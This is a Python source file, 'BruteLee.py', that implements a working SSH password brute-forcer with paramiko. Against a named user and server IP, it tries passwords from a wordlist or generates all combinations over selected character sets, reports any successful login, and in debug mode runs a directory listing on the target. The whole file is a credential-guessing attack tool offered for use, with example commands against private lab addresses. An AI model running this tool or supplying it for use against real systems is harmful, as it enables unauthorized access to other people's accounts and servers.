# -*- coding: utf-8 -*-
"""
Created on Wed Jun 13 12:53:05 2018
@author: Nick
"""

import time
import argparse
import paramiko

# Create a parser & command-line arguments
ap = argparse.ArgumentParser(usage="""'%(prog)s -u username -s serverIP [-pwl password_length ] [password character set options | -f passwordfile] \n
\n                          
Example 1: python BruteLee.py -u user02 -s 192.168.81.129 -num -fpw 01 -d \n

Connect to user02 at address 192.168.81.129, use only numbers in the password, use a forced password of 01 for testing, print debug information
\n
Example 2: python BruteLee.py -u user03 -s 192.168.81.129 -f 500_worst_passwords.txt \n

Connect to user03 at address 192.168.81.129, using the file 500_worst_passwords.txt. Add -fpw dragon -d to print debug info for this example.""")

ap.add_argument('-u',   '--username',  required = True,  help = 'Username whose password you are trying to find')
ap.add_argument('-s',   '--server',    required = True,  help = 'IP address of SSH server')
ap.add_argument('-pwl', '--pwlength',  required = False, default = 3, help='Password length, default = 3')
ap.add_argument('-lc',  '--lowercase', required = False, action='store_true', help = 'Use lower case characters in the password (default if not specified)')
ap.add_argument('-uc',  '--uppercase', required = False, action='store_true', help = 'Use upper case characters in the password')
ap.add_argument('-sym', '--symbols',   required = False, action='store_true', help = 'Use symbol characters in the password')
ap.add_argument('-num', '--numbers',   required = False, action='store_true', help = 'Use numbers in the password')
ap.add_argument('-p',   '--port',      required = False, default=22, help='Port to connect on, default = 22', type=int)
ap.add_argument('-fpw', '--forcepw',   required = False, help = 'Force this password to be used (testing purposes). Use with -d')
ap.add_argument('-f',   '--pwfile',    required = False, dest='pwfile', help='Text file containing passwords, one per line')
ap.add_argument('-d',   '--debug',     required = False, action='store_true', help='Print arguments & test connection with server, use with -fpw')

# when testing argument parsing, use the following format:
# 
#   ap.parse_args('-u user02 -s 192.168.81.130 -lc'.split())
#   Out[32]: Namespace(lowercase=True, numbers=False, pwfile=None, server='192.168.81.130', symbols=False, uppercase=False, username='user02')

# Define the character ranges
range_symbols1 = range(33,48)   #    !"#$%&'()*+,-./   excludes 48
range_symbols2 = range(58,65)   #    :;<=>?@
range_symbols3 = range(91,97)   #    [\]^_`
range_symbols4 = range(123,127) #    {|}~
range_numbers =  range(48,58)
range_lowercase = range(97,123)              
range_uppercase = range(65,91)

count      = 1   # no. of passwords tried so far
pwlevel    = 1   # password "level". right-hand digit = level 1
                 #   next-to-rightmost digit = level 2, etc
max_pw_len = 5   # maximum password length 
# globals, redefined in main
validchars = []  # list of valid password characters to try
username = ''
hostIP = ''
PW_FOUND = False

def test(password):
    #Use the password to connect to the nominated account.
    # Yes, globals are bad...
    global count
    global hostIP
    global username
    global PW_FOUND
   
    if (PW_FOUND == False):
        client = paramiko.SSHClient() 
        client.load_system_host_keys()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
 
        try:
            print(f'HostIP: {hostIP} Username: {username} Password: {password} : ' + ' Attempt: ' + str(count))
            client.connect(hostIP, port=22, username=username, password=password)
            print(f'======Password found: {password} ========')
            PW_FOUND = True
        except paramiko.AuthenticationException:
            pass  
        finally:
            client.close()       
     
        count += 1 
    return 

def getkey(outer_ch, pwlevel):
    # outer_ch is the left-hand side of the generated key, or password.
    # inner_ch is the currently-iterating side, or right-hand side of the key
    global validchars
    global max_pw_len
    for inner_ch in validchars:
         key = outer_ch + inner_ch
         test(key)
         if not (pwlevel >= max_pw_len): # if haven't reached max len, go down a level
            getkey(key, pwlevel+1)
         key = outer_ch                  # haven't finished current level, so reset key
                                         # and try a new inner_ch on the end
    return

def add_search_characters(char_range):
    #Add the specified character ranges to the list of characters for the 
    #brute-forder to try
    global validchars
    for ch in char_range:
        stch = ''.join(chr(ch))  #convert to string
        if (stch not in validchars):
            validchars.append(stch)
    return

def main(): 
    global username
    global hostIP
    global max_pw_len
    global PW_FOUND
    
    args = ap.parse_args() # conv to dictionary with vars(args)

    # if no character options given, default to lowercase
    if (not args.lowercase) and (not args.uppercase) and (not args.numbers) and (not args.symbols):
        add_search_characters(range_lowercase)
    else:    
        # Create valid character list
        if (args.lowercase):
            add_search_characters(range_lowercase)
        if (args.uppercase):
            add_search_characters(range_uppercase)
        if (args.numbers):
              add_search_characters(range_numbers)  
        if (args.symbols):
            add_search_characters(range_symbols1)    
            add_search_characters(range_symbols2)    
            add_search_characters(range_symbols3)    
            add_search_characters(range_symbols4)    
    
    username = args.username
    hostIP   = args.server
    max_pw_len = int(args.pwlength)

           
    if (args.debug): 
        print('===========DEBUG===========')
        print(f'Username is: {username}')
        print(f'The host is: {hostIP}')
        if (args.forcepw != ''):
            print(f'Forced password: {args.forcepw}')    
        if (args.pwfile != None):
            print(f'Password file: {args.pwfile}')
        else:
            print(f'Password length: {max_pw_len}') 
            vc = ''.join(validchars)  
            print(f'Character range: {vc}')
        
        # Set up a test connection
        client = paramiko.SSHClient()
        client.load_system_host_keys()
        #.AutoAddPolicy accounts for missing SSH certs
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        print('\nTesting connection: use forced password to list target directory...\n')
        client.connect(hostIP, port=22, username=username, password=args.forcepw)
        stdin, stdout, stderr = client.exec_command('ls -asCF')
        print(stdout.read())
        
        client.close()
        print('=========END DEBUG=========')
    
    localtime = time.asctime( time.localtime(time.time()) )
    print("\nBegin searching: " , localtime)
 
    if (args.pwfile != None):
        print(f'Using password file: {args.pwfile}')
        # file as iterable
        with open(args.pwfile) as password_file:
            for line in password_file:
                bad_password = line.rstrip('\n')  #remove line endings
                test(bad_password)
        if (PW_FOUND == False):
            print(f'No passwords found using file {args.pwfile}')
    else:
        print('Using brute forcer...')
        if (pwlevel == 1):
            getkey('', 1)
        if (PW_FOUND == False):
            print(f'No passwords found using brute forcer.')
        
    localtime = time.asctime( time.localtime(time.time()) )
    print("\nFinished search at: " , localtime)    
    print('\nTotal passwords searched: ' + str(count-1))    
    

if __name__ == "__main__":
    main()